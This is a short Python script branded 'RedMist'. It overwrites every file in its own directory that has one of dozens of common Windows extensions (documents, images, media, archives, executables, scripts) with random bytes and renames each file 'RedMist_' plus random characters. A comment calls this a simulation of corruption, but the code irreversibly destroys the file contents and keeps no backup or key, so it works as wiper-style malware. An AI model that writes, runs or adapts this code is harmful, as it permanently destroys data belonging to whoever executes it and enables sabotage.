import os
import random
import string

# Directory where the script is located
target_dir = os.path.dirname(os.path.abspath(__file__))

# Common file types used in Windows environments (broad coverage)
target_extensions = [
    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
    ".pdf", ".csv", ".rtf", ".odt", ".json", ".xml", ".log",
    ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".webp", ".svg",
    ".mp4", ".avi", ".mkv", ".mov", ".wmv", ".flv",
    ".mp3", ".wav", ".ogg", ".aac",
    ".zip", ".rar", ".7z", ".tar", ".gz",
    ".exe", ".dll", ".bat", ".sh", ".ps1", ".py", ".jar", ".iso",
    ".html", ".htm", ".css", ".js", ".php", ".asp", ".aspx"
]

# Overwrite and rename all matching files
for filename in os.listdir(target_dir):
    if any(filename.lower().endswith(ext) for ext in target_extensions):
        full_path = os.path.join(target_dir, filename)

        # Overwrite with random garbage (simulate corruption)
        try:
            with open(full_path, "wb") as f:
                f.write(os.urandom(random.randint(2048, 4096)))
        except Exception:
            continue  # Skip if file can't be accessed

        # Generate randomized filename with RedMist branding
        random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        new_name = f"RedMist_{random_suffix}"
        new_path = os.path.join(target_dir, new_name)

        try:
            os.rename(full_path, new_path)
        except Exception:
            continue